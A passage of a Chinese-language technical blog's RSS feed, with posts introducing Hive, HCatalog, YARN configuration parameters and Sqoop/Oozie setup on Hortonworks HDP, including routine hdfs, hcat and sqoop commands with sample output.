value:1
value:3
value:5
value:4
value:10
value:2
value:0
getAllChannels:ListBuffer(1, 3, 5, 4, 10, 2, 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;reference&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#reference&#34;&gt;
        ##
    &lt;/a&gt;
    Reference
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://community.hortonworks.com/articles/84071/apache-ambari-workflow-manager-view-for-apache-ooz-2.html&#34;&gt;Ambari workflow manager&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://docs.scala-lang.org/tour/basics.html&#34;&gt;Scala basics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/foundweekends/giter8/wiki/giter8-templates&#34;&gt;Giter8项目模版&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.hortonworks.com/HDPDocuments/HDP2/HDP-2.6.0/bk_spark-component-guide/content/ch_oozie-spark-action.html&#34;&gt;Automating Spark job with Oozie&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://community.hortonworks.com/articles/104949/using-virtualenv-with-pyspark-1.html&#34;&gt;Using VirtualEnv with PySpark&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Hive Intro</title>
      <link>/2018/01/hive-intro/</link>
      <pubDate>Thu, 11 Jan 2018 22:25:07 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/01/hive-intro/</guid>
      <description>&lt;h1 id=&#34;reference&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#reference&#34;&gt;
        ##
    &lt;/a&gt;
    Reference
&lt;/div&gt;
&lt;/h1&gt;
&lt;h1 id=&#34;-hive-documenthttpscwikiapacheorgconfluencedisplayhivehome&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#-hive-documenthttpscwikiapacheorgconfluencedisplayhivehome&#34;&gt;
        ##
    &lt;/a&gt;
    * &lt;a href=&#34;https://cwiki.apache.org/confluence/display/Hive/Home&#34;&gt;Hive document&lt;/a&gt;
&lt;/div&gt;
&lt;/h1&gt;
</description>
    </item>
    
    <item>
      <title>Hcatalog简介</title>
      <link>/2018/01/hcatalog%E7%AE%80%E4%BB%8B/</link>
      <pubDate>Thu, 11 Jan 2018 19:51:16 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/01/hcatalog%E7%AE%80%E4%BB%8B/</guid>
      <description>&lt;p&gt;HCatalog是Hadoop生态链中的一个有趣的组件。HCatalog构建于Hive的&lt;a href=&#34;http://hadooptutorial.info/hive-metastore-configuration/&#34;&gt;metastore&lt;/a&gt;之上并结合了Hive的DDL，通过服务的形式开放给Hadoop生态链中的其他组件，这样即可用一种统一的形式将Hive数据仓库中的数据的metadata开放给需要的服务，这样的话需要的服务就可以通过HCatalog来了解到所使用的数据的内容以及格式等等元信息。&lt;/p&gt;
&lt;p&gt;下图展示了HCatalog在Hadoop生态系统中的定位：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.stack.imgur.com/eAn8r.png&#34; alt=&#34;Architecture-001&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看出HCatalog内置可以支持多种数据格式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ORC&lt;/li&gt;
&lt;li&gt;RC&lt;/li&gt;
&lt;li&gt;Text&lt;/li&gt;
&lt;li&gt;SequenceFile&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外用户还可以自定义格式，不过需要编写InputFormat, OutputFormat, SerDe(Serializer/Deserializer):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.tutorialspoint.com/hcatalog/images/architecture.jpg&#34; alt=&#34;Architecture-002&#34;&gt;&lt;/p&gt;
&lt;p&gt;HCatalog提供了&amp;rsquo;hcat&#39;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ hcat
usage: hcat { -e &#34;&lt;query&gt;&#34; | -f &#34;&lt;filepath&gt;&#34; } [ -g &#34;&lt;group&gt;&#34; ] [ -p &#34;&lt;perms&gt;&#34; ] [ -D&#34;&lt;name&gt;=&lt;value&gt;&#34; ]
 -D &lt;property=value&gt;   use hadoop value for given property
 -e &lt;exec&gt;             hcat command given from command line
 -f &lt;file&gt;             hcat commands in file
 -g &lt;group&gt;            group for the db/table specified in CREATE statement
 -h,--help             Print help information
 -p &lt;perms&gt;            permissions for the db/table specified in CREATE statement
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数**-e**提供了使用Hive &amp;lsquo;DDL&amp;rsquo;命令的接口&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;DDL命令&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CREATE TABLE&lt;/td&gt;
&lt;td&gt;建表操作，注意如果建表时使用了“CLUSTERED BY”那么这个表不能被Pig和MapReduce使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ALTER TABLE&lt;/td&gt;
&lt;td&gt;修改表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SHOW TABLES&lt;/td&gt;
&lt;td&gt;查询表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DROP TABLE&lt;/td&gt;
&lt;td&gt;删除表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CREATE/ALTER/DROP VIEW&lt;/td&gt;
&lt;td&gt;管理view&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SHOW PARTITIONS&lt;/td&gt;
&lt;td&gt;查询分区表的分区信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Create/Drop Index&lt;/td&gt;
&lt;td&gt;管理index&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DESCRIBE&lt;/td&gt;
&lt;td&gt;查询表结构&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
$ hcat -e  &#34;show tables;&#34;
OK
activity
device
...
Time taken: 3.255 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;
# hcat -e &#34;describe device;&#34;
OK
id               bigint
uuid             string
time             string
type             int
address          string
Time taken: 3.824 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;APIs&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;API&lt;/th&gt;
&lt;th&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;HCatReader&lt;/td&gt;
&lt;td&gt;从hdfs中读取数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HCatWriter&lt;/td&gt;
&lt;td&gt;向hdfs中写入数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DataTransferFactory&lt;/td&gt;
&lt;td&gt;创建HCatReader/HCatWriter实例&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HCatInputFormat&lt;/td&gt;
&lt;td&gt;利用MapReduce job从表结构由HCatalog管理的表中读取并处理数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HCatOutputFormat&lt;/td&gt;
&lt;td&gt;利用MapReduce job处理数据并向表结构由HCatalog管理的表中写入数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HCatLoader&lt;/td&gt;
&lt;td&gt;Pig script用来读取表结构由HCatalog管理的数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HCatStorer&lt;/td&gt;
&lt;td&gt;Pig script用来写入表结构由HCatalog管理的数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考信息&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e4%bf%a1%e6%81%af&#34;&gt;
        ##
    &lt;/a&gt;
    参考信息
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.tutorialspoint.com/hcatalog/hcatalog_quick_guide.htm&#34;&gt;HCataLog quick guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://hadooptutorial.info/hive-metastore-configuration/&#34;&gt;Hive metastore&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Yarn Config</title>
      <link>/2017/12/yarn-config/</link>
      <pubDate>Fri, 29 Dec 2017 11:44:51 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/yarn-config/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;http://www.singleye.net/media/2017/12/yarn-config/ResourceManagement.jpg&#34; alt=&#34;Yarn config&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Resource manager&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Node manager&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Application master&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;资源&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Container&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;container所需资源，minimum/maximum memory/vcores&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Scheduler&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FIFO&lt;/li&gt;
&lt;li&gt;CapacityScheduler&lt;/li&gt;
&lt;li&gt;FairScheduler&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Queue&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Application &amp;mdash; scheduler &amp;mdash;&amp;gt; Queue&lt;/p&gt;
&lt;p&gt;yarn-site.xml中配置。&lt;/p&gt;
&lt;p&gt;下文引用自&lt;a href=&#34;http://dongxicheng.org/mapreduce-nextgen/hadoop-yarn-configurations-resourcemanager-nodemanager/&#34;&gt;http://dongxicheng.org/mapreduce-nextgen/hadoop-yarn-configurations-resourcemanager-nodemanager/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;node-manager&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#node-manager&#34;&gt;
        #
    &lt;/a&gt;
    Node manager
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;Node manager architecture&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://2xbbhjxc6wk3v21p62t8n4d4-wpengine.netdna-ssl.com/wp-content/uploads/2012/09/Node-Manager-Diagram-Small.png&#34; alt=&#34;Node manager&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;resourcemanager相关配置参数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#resourcemanager%e7%9b%b8%e5%85%b3%e9%85%8d%e7%bd%ae%e5%8f%82%e6%95%b0&#34;&gt;
        #
    &lt;/a&gt;
    ResourceManager相关配置参数
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;（1） yarn.resourcemanager.address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：ResourceManager 对客户端暴露的地址。客户端通过该地址向RM提交应用程序，杀死应用程序等。&lt;/p&gt;
&lt;p&gt;默认值：${yarn.resourcemanager.hostname}:8032&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（2） yarn.resourcemanager.scheduler.address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：ResourceManager 对ApplicationMaster暴露的访问地址。ApplicationMaster通过该地址向RM申请资源、释放资源等。&lt;/p&gt;
&lt;p&gt;默认值：${yarn.resourcemanager.hostname}:8030&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（3） yarn.resourcemanager.resource-tracker.address&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：ResourceManager 对NodeManager暴露的地址.。NodeManager通过该地址向RM汇报心跳，领取任务等。
默认值：${yarn.resourcemanager.hostname}:8031&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（4） yarn.resourcemanager.admin.address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：ResourceManager 对管理员暴露的访问地址。管理员通过该地址向RM发送管理命令等。&lt;/p&gt;
&lt;p&gt;默认值：${yarn.resourcemanager.hostname}:8033&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（5） yarn.resourcemanager.webapp.address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：ResourceManager对外web ui地址。用户可通过该地址在浏览器中查看集群各类信息。&lt;/p&gt;
&lt;p&gt;默认值：${yarn.resourcemanager.hostname}:8088&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（6） yarn.resourcemanager.scheduler.class&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：启用的资源调度器主类。目前可用的有FIFO、Capacity Scheduler和Fair Scheduler。&lt;/p&gt;
&lt;p&gt;默认值：
org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（7） yarn.resourcemanager.resource-tracker.client.thread-count&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：处理来自NodeManager的RPC请求的Handler数目。&lt;/p&gt;
&lt;p&gt;默认值：50&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（8） yarn.resourcemanager.scheduler.client.thread-count&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：处理来自ApplicationMaster的RPC请求的Handler数目。&lt;/p&gt;
&lt;p&gt;默认值：50&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（9） yarn.scheduler.minimum-allocation-mb/ yarn.scheduler.maximum-allocation-mb&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：单个可申请的最小/最大内存资源量。比如设置为1024和3072，则运行MapRedce作业时，每个Task最少可申请1024MB内存，最多可申请3072MB内存。&lt;/p&gt;
&lt;p&gt;默认值：1024/8192&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（10） yarn.scheduler.minimum-allocation-vcores / yarn.scheduler.maximum-allocation-vcores&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：单个可申请的最小/最大虚拟CPU个数。比如设置为1和4，则运行MapRedce作业时，每个Task最少可申请1个虚拟CPU，最多可申请4个虚拟CPU。什么是虚拟CPU，可阅读我的这篇文章：“YARN 资源调度器剖析”。&lt;/p&gt;
&lt;p&gt;默认值：1/32&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（11） yarn.resourcemanager.nodes.include-path /yarn.resourcemanager.nodes.exclude-path&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager黑白名单。如果发现若干个NodeManager存在问题，比如故障率很高，任务运行失败率高，则可以将之加入黑名单中。注意，这两个配置参数可以动态生效。（调用一个refresh命令即可）&lt;/p&gt;
&lt;p&gt;默认值：“”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（12） yarn.resourcemanager.nodemanagers.heartbeat-interval-ms&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager心跳间隔&lt;/p&gt;
&lt;p&gt;默认值：1000（毫秒）&lt;/p&gt;
&lt;h2 id=&#34;nodemanager相关配置参数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nodemanager%e7%9b%b8%e5%85%b3%e9%85%8d%e7%bd%ae%e5%8f%82%e6%95%b0&#34;&gt;
        #
    &lt;/a&gt;
    NodeManager相关配置参数
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;（1） yarn.nodemanager.resource.memory-mb&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager总的可用物理内存。注意，该参数是不可修改的，一旦设置，整个运行过程中不可动态修改。另外，该参数的默认值是8192MB，即使你的机器内存不够8192MB，YARN也会按照这些内存来使用（傻不傻？），因此，这个值通过一定要配置。不过，Apache已经正在尝试将该参数做成可动态修改的。&lt;/p&gt;
&lt;p&gt;默认值：8192&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（2） yarn.nodemanager.vmem-pmem-ratio&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：每使用1MB物理内存，最多可用的虚拟内存数。&lt;/p&gt;
&lt;p&gt;默认值：2.1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（3） yarn.nodemanager.resource.cpu-vcores&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager总的可用虚拟CPU个数。&lt;/p&gt;
&lt;p&gt;默认值：8&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（4） yarn.nodemanager.local-dirs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：中间结果存放位置，类似于1.0中的mapred.local.dir。注意，这个参数通常会配置多个目录，已分摊磁盘IO负载。&lt;/p&gt;
&lt;p&gt;默认值：${hadoop.tmp.dir}/nm-local-dir&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（5） yarn.nodemanager.log-dirs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：日志存放地址（可配置多个目录）。&lt;/p&gt;
&lt;p&gt;默认值：${yarn.log.dir}/userlogs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（6） yarn.nodemanager.log.retain-seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager上日志最多存放时间（不启用日志聚集功能时有效）。&lt;/p&gt;
&lt;p&gt;默认值：10800（3小时）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;（7） yarn.nodemanager.aux-services&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数解释：NodeManager上运行的附属服务。需配置成mapreduce_shuffle，才可运行MapReduce程序&lt;/p&gt;
&lt;p&gt;默认值：“”&lt;/p&gt;
&lt;p&gt;yarn-site.xml
yarn.scheduler.minimum-allocation-mb:341
yarn.scheduler.increment-allocation-mb:
yarn.scheduler.maximum-allocation-mb:1023&lt;/p&gt;
&lt;p&gt;节点分配给NodeManager的可用内存
yarn.nodemanager.resource.memory-mb:1023&lt;/p&gt;
&lt;p&gt;yarn.scheduler.minimum-allocation-mb &amp;lt; yarn.nodemanager.resource.memory-mb
yarn.scheduler.maximum-allocation-mb:1023 &amp;lt; yarn.nodemanager.resource.memory-mb&lt;/p&gt;
&lt;h2 id=&#34;mapred-sitexml&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#mapred-sitexml&#34;&gt;
        #
    &lt;/a&gt;
    mapred-site.xml
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;yarn.app.mapreduce.am.resource.mb： 341
mapreduce.map.memory.mb：341
mapreduce.reduce.memory.mb：682
mapreduce.task.io.sort.mb：190&lt;/p&gt;
&lt;p&gt;mapreduce.map.java.opts: -Xmx272m
mapreduce.reduce.java.opts: -Xmx545m&lt;/p&gt;
&lt;p&gt;Resource manager: bdtest-002&lt;/p&gt;
&lt;p&gt;Application manager:&lt;/p&gt;
&lt;p&gt;Node manager:&lt;/p&gt;
&lt;h1 id=&#34;yarn操作&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#yarn%e6%93%8d%e4%bd%9c&#34;&gt;
        ##
    &lt;/a&gt;
    Yarn操作
&lt;/div&gt;
&lt;/h1&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;查看application log&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  $ yarn logs -applicationId applicationID
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;控制application&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  yarn application -list
  yarn application -status
  yarn application -kill
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;yarn参考文章&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#yarn%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34;&gt;
        #
    &lt;/a&gt;
    Yarn参考文章
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.csdn.net/suifeng3051/article/details/49508261&#34;&gt;Yarn scheduler&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hadoop.apache.org/docs/r2.4.1/hadoop-yarn/hadoop-yarn-common/yarn-default.xml&#34;&gt;Yarn configure&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Sqoop介绍及使用</title>
      <link>/2017/12/sqoop%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 25 Dec 2017 18:11:29 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/sqoop%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8/</guid>
      <description>&lt;h1 id=&#34;1-hdp中使用sqoop进行工作流处理准备工作&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-hdp%e4%b8%ad%e4%bd%bf%e7%94%a8sqoop%e8%bf%9b%e8%a1%8c%e5%b7%a5%e4%bd%9c%e6%b5%81%e5%a4%84%e7%90%86%e5%87%86%e5%a4%87%e5%b7%a5%e4%bd%9c&#34;&gt;
        ##
    &lt;/a&gt;
    1. HDP中使用sqoop进行工作流处理准备工作
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;11-准备hdfs中的用户目录&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11-%e5%87%86%e5%a4%87hdfs%e4%b8%ad%e7%9a%84%e7%94%a8%e6%88%b7%e7%9b%ae%e5%bd%95&#34;&gt;
        #
    &lt;/a&gt;
    1.1 准备hdfs中的用户目录
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在进行hdfs操作前需要切换用户到&amp;rsquo;hdfs&#39;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  # su - hdfs
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为操作用户创建hdfs环境&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此处为ambari的admin用户准备环境：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	$ hdfs dfs -mkdir /user/admin
	$ hdfs dfs -chown admin:hdfs /user/admin
	$ hdfs dfs -ls /user
	$ hdfs dfs -chmod -R 770 /user/admin
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;12-配置ozzie&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#12-%e9%85%8d%e7%bd%aeozzie&#34;&gt;
        #
    &lt;/a&gt;
    1.2 配置ozzie
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;设置ozzie进程在hdfs中的proxy user&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  配置项：hadoop.proxyuser.oozie.groups
  值：$USER_GROUPS_THAT_ALLOW_IMPERSONATION

  配置项: hadoop.proxyuser.oozie.hosts
  值：$OOZIE_SERVER_HOSTNAME
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PS. 代理机制&lt;/strong&gt; ：&lt;a href=&#34;http://dongxicheng.org/mapreduce-nextgen/hadoop-secure-impersonation/&#34;&gt;http://dongxicheng.org/mapreduce-nextgen/hadoop-secure-impersonation/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://dongxicheng.org/wp-content/uploads/2014/03/Hadoop%E7%94%A8%E6%88%B7%E4%BC%AA%E8%A3%85%E6%9C%BA%E5%88%B6.jpg&#34; alt=&#34;proxy user mechanism&#34;&gt;&lt;/p&gt;
&lt;p&gt;主备namenode和resoucemanager（hadoop 2.0）上的core-site.xml中增加以下配置:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	&amp;lt;property&amp;gt;
	   &amp;lt;name&amp;gt;hadoop.proxyuser.oozie.groups&amp;lt;/name&amp;gt;
	   &amp;lt;value&amp;gt;group1,group2&amp;lt;value&amp;gt;
	&amp;lt;/property&amp;gt;
	&amp;lt;property&amp;gt;
	    &amp;lt;name&amp;gt;hadoop.proxyuser.oozie.hosts&amp;lt;/name&amp;gt;
	    &amp;lt;value&amp;gt;host1,host2&amp;lt;value&amp;gt;
	&amp;lt;/property&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里，假设用户user1属于group1（注意，这里的user1和group1都是linux用户和用户组，需要在namenode和jobtracker上进行添加），此外，为了限制客户端随意部署，超级用户代理功能只支持host1和host2两个节点。经过以上配置后，在host1和host2上的客户端上，属于group1和group2的用户可以sudo成oozie用户，执行作业流。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拷贝mysql-connector及配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;切换到oozie用户后执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	# 复制mysql-connector
	$ hdfs dfs -put /$PATH/mysql-connector-java-5.1.37.jar /user/oozie/share/lib/lib_$TIMESTAMP/sqoop
	
	# 复制配置文件
	$ hdfs dfs -put /etc/hive/conf/hive-site.xml /user/oozie/share/lib/lib_20171226172323/hive
	$ hdfs dfs -put /etc/hive2/conf/hive-site.xml /user/oozie/share/lib/lib_20171226172323/hive2

	# 通知Ozzie使用新的sharelib
	$ oozie admin -sharelibupdate
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.hortonworks.com/HDPDocuments/HDP2/HDP-2.6.3/bk_workflow-management/content/copy_files.html&#34;&gt;HDP doc&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;sqoop基本操作&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#sqoop%e5%9f%ba%e6%9c%ac%e6%93%8d%e4%bd%9c&#34;&gt;
        ##
    &lt;/a&gt;
    sqoop基本操作
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://sqoop.apache.org/docs/1.4.4/SqoopUserGuide.html#_importing_data_into_hive&#34;&gt;https://sqoop.apache.org/docs/1.4.4/SqoopUserGuide.html#_importing_data_into_hive&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;列举数据库(list-databases)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # sqoop list-databases --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P
 SLF4J: Class path contains multiple SLF4J bindings.
 SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/hadoop/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class]
 SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/accumulo/lib/slf4j-log4j12.jar!/org/slf4j/impl/StaticLoggerBinder.class]
 SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
 SLF4J: Actual binding is of type [org.slf4j.impl.Log4jLoggerFactory]
 17/12/25 18:27:40 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6.2.6.3.0-235
 Enter password:
 17/12/25 18:27:44 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
 information_schema
 iot_test_12
 mysql
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;简单查询(eval)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # sqoop eval --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --query &amp;quot;select date(add_time), count(*) from device group by date(add_time)&amp;quot;
 SLF4J: Class path contains multiple SLF4J bindings.
 SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/hadoop/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class]
 SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/accumulo/lib/slf4j-log4j12.jar!/org/slf4j/impl/StaticLoggerBinder.class]
 SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
 SLF4J: Actual binding is of type [org.slf4j.impl.Log4jLoggerFactory]
 17/12/25 18:32:47 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6.2.6.3.0-235
 Enter password:
 17/12/25 18:32:52 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
 -------------------------------------
 | date(add_time) | count(*)             |
 -------------------------------------
 | 2017-06-16 | 3                    |
 | 2017-06-23 | 1                    |
 | 2017-06-28 | 1                    |
 | 2017-07-06 | 1                    |
 | 2017-07-15 | 1                    |
